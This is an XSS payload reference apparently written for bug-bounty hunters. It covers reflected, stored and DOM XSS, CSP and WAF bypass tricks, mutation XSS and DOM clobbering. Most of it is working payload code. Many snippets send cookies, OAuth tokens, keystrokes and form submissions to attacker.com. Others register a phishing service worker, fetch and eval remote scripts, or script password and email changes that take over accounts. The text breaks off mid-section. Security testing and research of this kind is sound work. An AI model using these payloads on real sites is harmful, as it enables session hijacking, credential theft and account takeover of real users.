# XSS — Cross-Site Scripting

## Overview

Cross-Site Scripting (XSS) injects malicious scripts into web pages viewed by other
users. XSS falls under OWASP A03:2021 (Injection) and consistently appears in the top
HackerOne vulnerability categories by bounty volume.

**Types:**
- **Reflected** — payload in request, reflected in response, requires victim to click link
- **Stored** — payload persisted server-side, executes for all viewers of that content
- **DOM-based** — payload processed entirely client-side via unsafe JavaScript

**Impact:** Session hijacking, account takeover, credential phishing, keylogging,
CSRF token theft, malware distribution, defacement.

**Sources:**
- PortSwigger Web Security Academy — Cross-site scripting
- OWASP Testing Guide — OTG-INPVAL-001
- HackerOne Hacktivity — Twitter XSS ($5,040), Shopify stored XSS ($3,000+)

---

## Reflected XSS

Payload echoed from request directly into response. Requires victim to click a crafted URL.

### HTML Context

```html
<!-- Basic -->
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- Tag injection when < > not filtered -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

### Attribute Context

```html
<!-- Breaking out of attribute value -->
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
'><script>alert(1)</script>

<!-- When inside href attribute -->
javascript:alert(1)
javascript:alert(document.cookie)

<!-- data: URI for src attributes -->
data:text/html,<script>alert(1)</script>
```

### JavaScript Context

```javascript
// Breaking out of JS string
'-alert(1)-'
';alert(1)//
\';alert(1)//

// Template literal injection
`${alert(1)}`

// Regex context
/'-alert(1)-'/

// When inside a JS comment
*/alert(1)/*
```

### URL Parameter Injection

```
https://target.com/search?q=<script>alert(1)</script>
https://target.com/search?q="><img src=x onerror=alert(1)>
https://target.com/error?msg=<svg/onload=alert(1)>
```

---

## Stored XSS

Payload is saved server-side and executes whenever the stored content is rendered.

### High-Value Storage Targets

```
- Profile fields: username, bio, display name, company, location
- Comments and reviews
- Chat messages (especially admin-facing support chats)
- Ticket/issue descriptions and comments
- File upload filename (displayed in UI)
- Address / shipping fields
- Custom dashboard widget names or labels
- API key descriptions or app names (OAuth apps)
- Notification messages or custom alert text
- Error messages that echo user input
```

### SVG Upload XSS

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">alert(document.cookie);</script>
</svg>
```

### HTML File Upload XSS

```html
<!-- Upload as .html or .htm if allowed -->
<!DOCTYPE html>
<html><body>
<script>
fetch('https://attacker.com/steal?c=' + document.cookie);
</script>
</body></html>
```

---

## DOM-Based XSS

Vulnerability exists entirely in client-side JavaScript — no server involvement in
the injection path.

### Sources (attacker-controlled input)

```javascript
location.href
location.search       // ?param=value
location.hash         // #value
location.pathname
document.URL
document.referrer
document.cookie       // when attacker can set cookies (e.g., CRLF injection)
window.name
postMessage (event.data)
localStorage / sessionStorage  // if attacker can write via other means
```

### Dangerous Sinks

```javascript
// Direct HTML injection
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
document.writeln(userInput);

// URL-based sinks
location.href = userInput;
location.replace(userInput);
location.assign(userInput);
element.src = userInput;
element.href = userInput;
element.action = userInput;

// JS execution sinks
eval(userInput);
setTimeout(userInput, 0);
setInterval(userInput, 0);
new Function(userInput)();
element.setAttribute('onload', userInput);

// jQuery-specific
$(userInput)            // Selector treated as HTML
$.html(userInput)
$.append(userInput)
```

### DOM XSS via Hash / Search

```javascript
// Vulnerable pattern: writes hash directly to innerHTML
document.getElementById('output').innerHTML = location.hash.slice(1);

// Exploit URL:
https://target.com/page#<img src=x onerror=alert(1)>

// Vulnerable search param write
var search = new URLSearchParams(location.search);
document.querySelector('.result').innerHTML = search.get('q');
// Exploit: https://target.com/?q=<svg onload=alert(1)>
```

### postMessage DOM XSS

```javascript
// Vulnerable listener with no origin check
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
});

// Exploit from attacker.com:
var target = window.open('https://victim.com');
target.postMessage('<img src=x onerror=alert(1)>', '*');
```

### AngularJS Template Injection

```javascript
// In AngularJS 1.x (pre-sandbox escape era or broken sandbox)
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}

// Sandbox escapes (Angular 1.0-1.5):
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

---

## CSP Bypass Techniques

### JSONP Endpoint Abuse

```html
<!-- If CSP whitelists googleapis.com, find a JSONP endpoint there -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

<!-- Common JSONP bypass targets when domain is whitelisted -->
<script src="https://WHITELISTED-CDN.com/jsonp?callback=alert(1)"></script>
```

### Unsafe-Inline via Nonce Leak

```html
<!-- If nonce leaks in a reflected context (e.g., meta tag, inline data) -->
<!-- Read the nonce value and include it in your payload -->
<script nonce="LEAKED-NONCE">alert(1)</script>
```

### base-uri Injection

```html
<!-- CSP without base-uri restriction allows base tag injection -->
<!-- Relative script src then loads from attacker's domain -->
<base href="https://attacker.com/">
<!-- Existing relative <script src="/js/app.js"> now loads from attacker.com -->
```

### Script Gadgets (bypass strict-dynamic / trusted types)

```html
<!-- Angular gadget: if angular.js loaded from whitelisted domain -->
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>

<!-- jQuery gadget: if jQuery loaded -->
<script>$.globalEval('alert(1)')</script>

<!-- Script gadget tools: https://github.com/nicerstomsorg/csp-bypass -->
```

### CDN-Hosted Library Abuse

```html
<!-- If CDN like cdnjs.cloudflare.com is whitelisted, find a gadget in any hosted lib -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

---

## Prototype Pollution → XSS

### Client-Side Prototype Pollution

```javascript
// Injecting into Object.prototype via query params
?__proto__[x]=alert(1)
?constructor[prototype][x]=alert(1)

// JSON-based (if app uses JSON.parse with merge)
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
```

### Gadget Chains

```javascript
// jQuery < 3.4 — $.extend deep merge pollutes prototype
$.extend(true, {}, JSON.parse(userInput));

// Lodash _.merge (pre-4.17.5) — merge pollutes prototype
_.merge({}, userInput);

// Once Object.prototype is polluted, find a gadget that uses it:
// e.g., if code does: var opts = {}; document.write(opts.template)
// and template key is undefined — prototype pollution sets it to payload
```

### Common Gadgets to Test After Pollution

```javascript
// After polluting __proto__.innerHTML or __proto__.srcdoc:
document.getElementById('x').innerHTML = obj.innerHTML || '';
// → If obj.innerHTML is undefined, falls back to prototype → XSS

// Check for gadgets in DOMPurify, sanitize-html, angular, etc.
```

---

## WAF / Filter Bypass Payloads

### Case and Tag Variation

```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<sCrIpT/src="data:,alert(1)">
```

### Alternative Event Handlers

```html
<img src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<object data="javascript:alert(1)">
<body onresize=alert(1) style="height:1px">
<body onscroll=alert(1)><br><br><br>...<br>
<input type=image src=x onerror=alert(1)>
<isindex action="javascript:alert(1)" type=image>
```

### HTML5 Vectors

```html
<details open ontoggle=alert(1)>
<dialog open onclose=alert(1)>
<math href="javascript:alert(1)">click</math>
<keygen autofocus onfocus=alert(1)>
```

### SVG and MathML

```html
<svg><script>alert&#40;1&#41;</script></svg>
<svg><script>alert(1)</script></svg>
<math><mtext></p><script>alert(1)</script></mtext></math>
```

### Encoding Bypass

```html
<!-- HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<!-- Unicode -->
<script>alert(1)</script>
<!-- Hex encoding in JS string -->
<script>eval('\x61\x6c\x65\x72\x74\x281\x29')</script>
```

### Polyglots

```
javascript:"/*\"/*`/*' /*</template>
</textarea></xmp></style></noscript></noembed></select></script>
<-- <img src=x:confirm`` onerror=eval(src) ''> -->
```

### Comment Injection to Break Filters

```html
<!-- Break keyword matching -->
<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
<img src=x onerror="alert(1)">
```

---

## XSS → Account Takeover Chains

### Cookie Theft

```javascript
// Exfiltrate cookies to attacker server
<script>
new Image().src = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
</script>

// Via fetch
<script>
fetch('https://attacker.com/steal?c=' + btoa(document.cookie));
</script>
```

### CSRF Token Theft + Action

```javascript
// 1. Fetch the page with CSRF token
// 2. Extract token
// 3. Submit form with stolen token
<script>
fetch('/account/settings')
  .then(r => r.text())
  .then(html => {
    var token = html.match(/csrf[_-]token['"]\s+value=['"]([^'"]+)/i)[1];
    return fetch('/account/email', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'email=attacker@evil.com&csrf_token=' + token
    });
  });
</script>
```

### OAuth Token Theft via postMessage

```javascript
// If app uses postMessage to return OAuth tokens from popup:
<script>
window.addEventListener('message', function(e) {
  fetch('https://attacker.com/steal?token=' + JSON.stringify(e.data));
});
// Then trigger the OAuth popup from within XSS context
window.open('/oauth/authorize?...');
</script>
```

### Password Change via XSS (No Old Password Required)

```javascript
<script>
fetch('/account/change_password', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({new_password: 'Hacked123!', confirm_password: 'Hacked123!'})
});
</script>
```

### Add Attacker-Controlled Email / 2FA Bypass

```javascript
// Add attacker email as secondary → trigger verify → take over
<script>
fetch('/api/account/emails', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
```

---

## Common DOM XSS Source → Sink Pairs

| Source | Sink | Example |
|--------|------|---------|
| `location.hash` | `innerHTML` | `el.innerHTML = location.hash.slice(1)` |
| `location.search` | `document.write` | `document.write(new URLSearchParams(location.search).get('q'))` |
| `document.referrer` | `innerHTML` | Display "back to" link using referrer |
| `postMessage event.data` | `innerHTML` | Trusted-origin-less message listener |
| `localStorage` value | `eval` | Deserializing stored user preferences |
| `window.name` | `innerHTML` | Cross-page data passing via window.name |
| `location.href` | `location.href` (open redirect) | `location = location.search.slice(5)` |

### Framework-Specific Dangerous APIs

```javascript
// React — bypasses virtual DOM sanitization
dangerouslySetInnerHTML={{ __html: userInput }}

// Vue — renders raw HTML
<div v-html="userInput"></div>

// Angular — bypass DomSanitizer
this.sanitizer.bypassSecurityTrustHtml(userInput)

// jQuery — treats string as HTML if it starts with <
$(userInput)  // jQuery selector / HTML insertion
$('div').html(userInput)
$('div').append(userInput)
```

---

## Detection Notes

- Test every input field — not just search bars; focus on lesser-tested areas (filenames, headers, API responses rendered in UI)
- Use unique strings (e.g., `xsstest1234`) first to find where input is reflected before adding event handlers
- Check both HTML source and DOM (rendered) — some XSS only appears after JS renders the page
- For stored XSS, check if the payload executes in admin panels viewing user-submitted content
- Use browser DevTools console errors to identify blocked payloads and tune bypasses
- Test CSP header with `https://csp-evaluator.withgoogle.com/` to identify bypasses before crafting payloads

---

## Advanced Techniques

### Mutation XSS (mXSS)

Browser HTML parsing mutates certain inputs after sanitization, re-introducing XSS
after the sanitizer already passed the content. Exploits differences between the
serializer and the parser.

```html
<!-- noscript mutation: sanitizer sees harmless text, browser re-parses as XSS -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- table context mutation -->
<table><td id="</td><img src=x onerror=alert(1)>

<!-- namespace confusion mutation (HTML → SVG → HTML) -->
<svg><p><style><img src=1 onerror=alert(1)></style></p></svg>
```

**Root cause:** DOMPurify, sanitize-html, and similar libraries serialize their output
using innerHTML. When the browser re-parses that output in a different context (e.g.,
after JS sets innerHTML again), the HTML is parsed differently — introducing elements
the sanitizer never saw.

**Reference:** mXSS attacks by Mario Heiderich; DOMPurify bypass research.

### CSS-Based Injection (Content Visibility State Change)

```html
<!-- Triggers on browsers supporting content-visibility CSS property -->
<!-- Works on hidden inputs — no user interaction required in some browsers -->
<input type="hidden"
  oncontentvisibilityautostatechange="alert(1)"
  style="content-visibility:auto">

<!-- Works in Chromium 105+ when content-visibility triggers a state change -->
<div style="content-visibility:auto"
  oncontentvisibilityautostatechange="alert(document.cookie)">content</div>
```

### Remote Payload Fetch via SVG/fetch

```javascript
// Load and eval external JS to keep payload URL-safe and short
<svg/onload='fetch("//attacker.com/xss.js").then(r=>r.text().then(t=>eval(t)))'>

// Useful when: payload length is limited, WAF blocks inline JS keywords
// External file xss.js contains the actual exploitation code
```

### URI Scheme Whitespace Bypass (javascript: filter evasion)

```javascript
// Insert whitespace characters between "java" and "script"
// These are stripped by HTML parser before href is evaluated
java%0ascript:alert(1)    // newline (LF)
java%09script:alert(1)    // tab
java%0dscript:alert(1)    // carriage return (CR)
javascript://%0Aalert(1)  // comment + newline trick

// Use in href, src, action attributes
<a href="java%0ascript:alert(1)">click</a>
```

### Markdown Injection → XSS

```markdown
[click me](javascript:alert(document.cookie))
[click me](javascript:prompt(document.cookie))

// data: URI with base64-encoded XSS page
[click me](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
```

**Where to test:** Any field that renders user input as Markdown (GitHub, GitLab,
Jira, Confluence, chat applications, README preview, comment sections).

### Uppercase Encoding Bypass

```html
<!-- Hex entities with uppercase X bypass case-sensitive entity filters -->
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>

<!-- Decimal entities mixed with raw chars -->
<img src=x onerror=&#97lert(1)>   <!-- some parsers strip & and # leaving alert -->
```

### postMessage XSS — Sender Confusion

```javascript
// App checks e.data.sender but doesn't verify e.origin
window.addEventListener('message', function(e) {
    if (e.data.sender === 'accounts') {
        location.href = e.data.url;   // open redirect / XSS via javascript:
    }
});

// Exploit from any origin:
window.poc = window.open('https://victim.com');
setTimeout(() => {
    window.poc.postMessage(
        {"sender": "accounts", "url": "javascript:alert(document.cookie)"},
        '*'
    );
}, 2000);
```

### Nested SVG and Foreign Object

```html
<!-- foreignObject creates an HTML namespace inside SVG — bypasses some parsers -->
<svg>
  <foreignObject width="100%" height="100%">
    <div xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(1)</script>
    </div>
  </foreignObject>
</svg>

<!-- Nested SVG inside HTML — different parsing contexts -->
<svg><svg onload=alert(1)>
```

---

## Threat Model

> Current patterns as of 2026-Q2. Update each session.

**What's being exploited in the wild:**

1. **DOM XSS in SPAs via postMessage** — Single-page apps (React, Vue, Angular) use
   postMessage for cross-frame communication. Weak or missing origin checks are
   extremely common. Particularly dangerous in OAuth flows where tokens are passed
   via postMessage from popup windows.

2. **Mutation XSS (mXSS) against sanitizers** — DOMPurify bypasses are discovered
   regularly (tracked in their changelog). Apps that sanitize server-side then re-insert
   via innerHTML are vulnerable. Electron apps with `nodeIntegration` + mXSS = RCE.

3. **oncontentvisibilityautostatechange** — New CSS event handler that bypasses many
   WAF rules and sanitizers because it's a recent browser feature not yet in block lists.
   Works on hidden inputs without user interaction.

4. **CSP via JSONP still unpatched at scale** — Many large platforms whitelist CDNs or
   partner domains that serve JSONP. Report volume on HackerOne for this pattern remains
   high. Always run `csp-evaluator.withgoogle.com` before concluding CSP blocks you.

5. **Stored XSS in admin notification paths** — Bug hunters are finding stored XSS in
   low-visibility fields (API key names, webhook descriptions) that only render in admin
   panels. Impact is critical (admin ATO) despite the obscure injection point.

---

## Bypass Matrix

| Filter / Defense | Bypass Technique | Payload Example |
|-----------------|------------------|-----------------|
| `<script>` blocked | Event handler injection | `<img src=x onerror=alert(1)>` |
| All tags blocked | Attribute injection (break out of attr) | `" onmouseover="alert(1)` |
| HTML tags + attrs blocked | JS context injection | `';alert(1)//` |
| `javascript:` blocked | URI whitespace bypass | `java%0ascript:alert(1)` |
| `alert` keyword blocked | `confirm`, `prompt`, `console.log` | `<img src=x onerror=confirm(1)>` |
| `()` blocked | Template literal / backtick | `alert\`1\`` |
| `alert` + `()` + backtick blocked | `eval` with encoded string | `eval('\x61\x6c\x65\x72\x74\x281\x29')` |
| Length limit | Remote payload fetch | `<svg/onload='fetch("//x.co/a").then(r=>r.text().then(eval))'>` |
| Sanitizer (DOMPurify) | mXSS via noscript/namespace mutation | `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` |
| CSP `script-src self` | JSONP on whitelisted domain | `<script src="//whitelisted.com/jsonp?cb=alert(1)">` |
| CSP `strict-dynamic` | Script gadget in loaded library | Angular `ng-app` + `{{constructor.constructor('alert(1)')()}}` |
| WAF keyword filter | Uppercase entities | `&#X61;&#X6C;&#X65;&#X72;&#X74;(1)` |
| WAF tag filter | SVG foreignObject | `<svg><foreignObject><div xmlns="..."><script>alert(1)</script></div></foreignObject></svg>` |

---

## High-Value Targets

| Target | Why High Value | Impact |
|--------|---------------|--------|
| Admin panel viewing user-submitted content | XSS fires in admin context | Admin ATO, full platform access |
| OAuth popup that postMessages token | Steal token via wildcard postMessage | Account takeover |
| File upload with SVG/HTML allowed | Stored XSS with no interaction barrier | All viewers affected |
| Support chat (messages visible to agents) | Agent cookie/session theft | Support agent ATO |
| API key / webhook name fields | Often rendered in admin dashboard | Admin XSS |
| PDF/report generator with user content | XSS in headless browser = SSRF | Can chain to SSRF → IMDS |
| Electron apps | `nodeIntegration` may be enabled | XSS → RCE (OS command execution) |
| Browser extensions | `chrome.tabs`, `externally_connectable` misuse | Extension privilege escalation |
| React with `dangerouslySetInnerHTML` | Bypasses React's DOM sanitization | Stored/reflected XSS |
| Legacy AngularJS (1.x) in SPAs | Template injection in `ng-bind-html` | Full XSS via `{{}}` expressions |

---

## Real-World Chains

### Chain 1: Stored XSS in API Key Name → Admin ATO

```
1. Target: SaaS platform where API key names are displayed in admin billing view
2. Create an API key with name: <img src=x onerror="fetch('/api/admin/users').then(...)">
3. Admin opens billing page → XSS fires in admin context
4. XSS payload:
   a. Fetch admin's CSRF token from settings page
   b. POST to /api/admin/users → create new admin user with attacker email
   c. Or: exfil admin's session cookie to attacker server
5. Attacker logs in as admin

Impact: Critical — full platform admin access
Real pattern: HackerOne reports on SaaS platforms (Shopify, GitLab, others)
```

### Chain 2: DOM XSS via postMessage → OAuth Token Theft

```
1. Find SPA that uses postMessage to receive OAuth tokens from popup:
   window.addEventListener('message', function(e) {
     if (e.data.type === 'oauth_token') { storeToken(e.data.token); }
   }); // No origin check
2. Host exploit page on attacker.com:
   var victim = window.open('https://target.com/app');
   setTimeout(() => {
     // First: DOM XSS to open popup and intercept the real token
     // Or: Directly steal via message listener race
     window.addEventListener('message', function(e) {
       fetch('https://attacker.com/steal?t=' + JSON.stringify(e.data));
     });
   }, 3000);
3. Victim visits attacker.com → their OAuth token is exfilled
4. Attacker uses token to access victim's account via API

Impact: Critical — account takeover without victim interaction
```

### Chain 3: mXSS Bypass → Stored XSS in Markdown

```
1. App uses DOMPurify to sanitize Markdown-rendered HTML before inserting via innerHTML
2. Inject mXSS payload in a comment field:
   <noscript><p title="</noscript><img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>">
3. DOMPurify serializes and sees: <noscript>...</noscript> — passes as safe
4. Browser parses the serialized output again via innerHTML → noscript tag ends early
   → img tag is introduced → onerror fires
5. All users who view the comment are affected

Impact: High — stored XSS affecting all comment viewers
```

### Chain 4: XSS → Service Worker Injection → Persistent XSS

```javascript
// 1. Find XSS on target.com
// 2. Register a malicious service worker that intercepts all future requests:
<script>
navigator.serviceWorker.register('data:application/javascript,'+encodeURIComponent(`
  self.addEventListener('fetch', e => {
    if (e.request.url.includes('/login')) {
      e.respondWith(new Response(
        '<form action="https://attacker.com/steal" method=POST>'+
        '<input name=user><input name=pass type=password><button>Login</button></form>',
        {headers: {'Content-Type': 'text/html'}}
      ));
    }
  });
`));
</script>
// 3. Service worker persists after XSS page is closed
// 4. All future visits to /login serve attacker's phishing form
// 5. Credentials POSTed to attacker.com

Impact: Critical — persistent phishing even after XSS session ends
Note: data: scheme for SW registration is Chrome-only; requires HTTPS origin
```

### Chain 5: Reflected XSS + Self-XSS Escalation via CSRF

```
1. Find self-XSS in a setting that requires user interaction (paste something here)
2. Find CSRF vulnerability on the same endpoint
3. Combine: craft CSRF request that submits the XSS payload on behalf of victim
4. Victim visits attacker page → CSRF fires → XSS payload stored in victim's profile
5. XSS executes when victim views their own profile

Impact: Medium-High — converts self-XSS + CSRF into stored XSS
Technique used in: multiple HackerOne reports where self-XSS alone was N/A'd
```


---

## XSS Without Parentheses

**Type:** reflected / stored / DOM
**Filter bypassed:** WAF / regex rules blocking `()` function call syntax
**Bypass logic:** JavaScript provides multiple ways to invoke functions without the `(` `)` characters — template literals, error handler assignment, operator overloading, and prototype manipulation.
**Attack chain:** XSS → cookie/token exfil → account takeover

**Payloads:**
```javascript
// Template literal invocation — works anywhere alert() works
alert`1`
confirm`document.cookie`

// Error handler + throw — no parens anywhere
onerror=alert;throw 1
<img src=x onerror="onerror=alert;throw 1">

// Destructuring + throw
{onerror=alert}throw 1

// window.name cross-page relay (set name first, then eval via location)
// Page 1 (attacker controlled): window.name = "alert(document.cookie)"
// Page 2 (victim, via DOM XSS): location = name
<script>location=name</script>

// Reflect.apply.call with template string
Reflect.apply.call`${alert}${undefined}${[1]}`

// Symbol.hasInstance prototype override
Array.prototype[Symbol.hasInstance]=eval;"alert\x281\x29" instanceof[]

// DOMMatrix property chain → javascript: navigation
x=new DOMMatrix;matrix=alert;x.a=1;location='javascript'+':'+x

// Array prototype sort trick
[].sort.call`${alert}1`
```
**Source:** https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md

---

## Number-Based Eval Obfuscation (toString Base Conversion)

**Type:** reflected / stored
**Filter bypassed:** WAF / keyword filters blocking `alert`, `confirm`, `prompt`, `eval` as plaintext strings
**Bypass logic:** JavaScript numbers have a `.toString(radix)` method. Certain numbers in certain bases spell out JavaScript function names. The function is then called via `eval()` or bracket notation — all as numeric literals that bypass string-matching WAF rules.
**Attack chain:** XSS → arbitrary JS execution → cookie/token exfil → ATO

**Payloads:**
```javascript
// 8680439 in base 30 = "confirm", 983801 in base 36 = "1"
<script>eval(8680439..toString(30))(983801..toString(36))</script>

// Generic approach — find the number for your function:
// In browser console: parseInt("alert", 36) → 17302

// Chained with hex eval
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
// \x61=a \x6c=l \x65=e \x72=r \x74=t → alert(1)

// Combined obfuscation
<script>
var f=eval,a=8680439..toString(30);
f(a)(document['cookie'])
</script>
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## Touch Event Handler XSS (Mobile WAF Bypass)

**Type:** reflected / stored
**Filter bypassed:** WAF rules blocking mouse-based event handlers (`onclick`, `onmouseover`, `onmouseenter`) while ignoring mobile touch events
**Bypass logic:** Touch events (`ontouchstart`, `ontouchend`, `ontouchmove`) are mobile-specific handlers absent from many WAF blocklists. On touch-capable devices or emulators they fire without click interaction.
**Attack chain:** XSS → fires on mobile page load/swipe → cookie theft → ATO

**Payloads:**
```html
<!-- Fires on any touch contact with screen -->
<body ontouchstart=alert(document.cookie)>

<!-- Fires when touch ends (finger lifted) -->
<body ontouchend=alert(1)>

<!-- Fires during drag/swipe motion -->
<body ontouchmove=alert(1)>

<!-- With exfil payload on real touch device -->
<body ontouchstart="fetch('https://attacker.com/c?d='+document.cookie)">

<!-- Combined desktop+mobile fallback -->
<div ontouchstart=alert(1) onclick=alert(1) onmouseover=alert(1)>tap or hover</div>
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## String.fromCharCode Keyword Obfuscation

**Type:** reflected / stored / DOM
**Filter bypassed:** WAF / sanitizer keyword detection blocking `alert`, `confirm`, `document`, `cookie`, `eval` as plaintext
**Bypass logic:** `String.fromCharCode()` converts character code arrays back to strings at runtime, never exposing blocked keywords in source. Works in any JavaScript execution context.
**Attack chain:** XSS → bypasses keyword WAF → executes cookie theft → session hijack

**Payloads:**
```javascript
// alert(1) via fromCharCode
<script>alert(String.fromCharCode(49))</script>

// Full cookie exfil without any blocked keywords in source
<img src=x onerror="
  var c=String.fromCharCode(100,111,99,117,109,101,110,116,46,99,111,111,107,105,101);
  new Image().src='//attacker.com/?'+eval(c)
">
// String.fromCharCode(100,111,...) = 'document.cookie'

// Compact eval form
<script>
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
// = eval('alert(1)')
</script>
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## DOM Clobbering → XSS

**Type:** DOM / stored
**Filter bypassed:** Sanitizers / CSP (no `script` execution required for setup); app logic that trusts DOM globals as safe
**Bypass logic:** HTML elements with `id` attributes create named global variables on `window`. By injecting innocuous HTML (anchor, form, input tags — often allowed by sanitizers), an attacker overwrites JavaScript global variables that app code reads — causing those reads to return attacker-controlled values (URLs, HTML strings), which then flow into dangerous sinks.
**Attack chain:** HTML injection (zero JS, passes sanitizer) → clobber global → app reads clobbered value → loads attacker script / navigates to `javascript:` URI → XSS → ATO

**Payloads:**
```html
<!-- Clobber window.x with anchor href -->
<a id=x href="javascript:alert(1)">click</a>
<!-- Code: if(x) location = x  →  navigates to javascript:alert(1) -->

<!-- Clobber window.x.y (nested) via form + input -->
<form id=x><input id=y name=z value="javascript:alert(1)"></form>
<!-- Code: config.url = x.y.z  →  loads javascript: URI -->

<!-- base-uri clobbering — forces relative script loads to attacker domain -->
<base href="https://attacker.com/">
<!-- Any relative <script src="/js/app.js"> now loads from attacker.com -->

<!-- Double-anchor trick for property.property (HTMLCollection) -->
<a id=csrf><a id=csrf name=token href="//attacker.com/steal">
<!-- window.csrf.token → HTMLCollection → first anchor → href = attacker URL -->

<!-- Clobber document.forms action -->
<form name=login><input name=action value="https://attacker.com/phish"></form>
<!-- Code reading document.forms.login.action gets attacker URL -->

<!-- Clobber a security-check variable (sanitizeConfig.allowedDomain) -->
<a id=sanitizeConfig href="https://evil.com/evil.js"></a>
<!-- Code: loadScript(sanitizeConfig.href) → loads attacker JS -->
```
**Source:** https://portswigger.net/research/dom-clobbering-strikes-back ; https://research.securitum.com/dom-clobbering/

---

## Browser-Specific Legacy Sinks

**Type:** DOM / reflected
**Filter bypassed:** Modern-browser-only scanners; WAF rules tuned to current browser APIs, missing IE/legacy-Firefox sinks
**Bypass logic:** IE and legacy Firefox expose execution sinks absent from modern browsers. Corporate intranets, banking portals, and internal tooling often still run IE or legacy Firefox — making these sinks viable in enterprise/intranet bug bounty scope.
**Attack chain:** XSS via legacy sink → arbitrary JS execution → session theft → ATO

**Payloads:**
```javascript
// execScript — IE 6+, equivalent to eval()
window.execScript("alert(document.cookie)");
<script>execScript("alert(1)")</script>

// setImmediate — IE 10+, string arg executes as code
setImmediate("alert(1)");

// crypto.generateCRMFRequest — old Firefox, 5th param executes as JS
crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use');

// ScriptElement.text — write code directly to script element (IE + modern)
var s=document.createElement('script');
s.text='alert(1)';
document.body.appendChild(s);

// ScriptElement.innerText (all except old Firefox)
var s=document.createElement('script');
s.innerText='alert(1)';
document.body.appendChild(s);

// ScriptElement.src — load remote script via DOM sink
var s=document.createElement('script');
s.src='https://attacker.com/xss.js';
document.head.appendChild(s);
```
**Source:** https://github.com/wisec/domxsswiki/wiki/Direct-Execution-Sinks

---

## XSS Keylogger Chain

**Type:** stored / DOM
**Filter bypassed:** n/a — post-execution payload that exfils real-time keystrokes invisibly
**Bypass logic:** After achieving XSS, inject a persistent `keypress`/`submit` listener that streams each keystroke or full form submission to the attacker's server. Captures passwords typed after XSS fires — including re-authentication prompts — bypassing 2FA if credentials are reused.
**Attack chain:** Stored XSS → invisible keylogger injected → victim types password → credentials exfilled → full account takeover (bypasses 2FA)

**Payloads:**
```javascript
// Basic per-keystroke exfil (self-removes img tag)
<img src=x onerror='
  document.onkeypress=function(e){
    fetch("https://attacker.com/k?k="+String.fromCharCode(e.which))
  };this.remove();
'>

// Batched exfil every 2 seconds (less noisy)
<svg onload="
  var keys='';
  document.addEventListener('keypress',function(e){keys+=e.key});
  setInterval(function(){
    if(keys){fetch('https://attacker.com/k?b='+btoa(keys));keys='';}
  },2000);
">

// Password field specific (minimal noise)
<script>
document.addEventListener('keypress',function(e){
  if(e.target.type==='password'){
    fetch('https://attacker.com/pwd?k='+encodeURIComponent(e.key));
  }
});
</script>

// Full form capture on submit
<script>
document.addEventListener('submit',function(e){
  var data=new FormData(e.target);
  fetch('https://attacker.com/form',{
    method:'POST',mode:'no-cors',
    body:JSON.stringify(Object.fromEntries(data))
  });
});
</script>
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## Octal Encoding Protocol Bypass

**Type:** reflected / DOM
**Filter bypassed:** WAF / sanitizer string-matching on `javascript:` in `href`/`src` attributes without decoding octal first
**Bypass logic:** JavaScript string literals support octal escape sequences (`\1nn`). Encoding `javascript:` in octal produces a string that evaluates identically but is invisible to string-pattern filters. Works in JS contexts where the string is later passed to a URL sink or `eval`.
**Attack chain:** XSS via href injection → octal-encoded `javascript:` URI bypasses filter → JS execution → cookie theft

**Payloads:**
```javascript
// Octal of "javascript:alert(1)": j=\152 a=\141 v=\166 a=\141 s=\163 c=\143
